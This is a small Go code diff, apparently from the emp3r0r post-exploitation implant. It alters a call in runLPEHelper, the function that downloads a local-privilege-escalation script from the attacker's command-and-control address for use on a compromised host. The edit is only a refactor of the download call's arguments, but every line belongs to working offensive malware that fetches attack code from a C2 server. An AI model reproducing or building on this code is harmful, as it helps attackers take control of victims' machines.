@@ -42,7 +42,7 @@ func CopySelfTo(dest_file string) (err error) {
 func runLPEHelper(method, checksum string) (out string) {
 	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := SmartDownload(method, "", checksum)
+	scriptData, err := SmartDownload("", method, "", checksum)
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
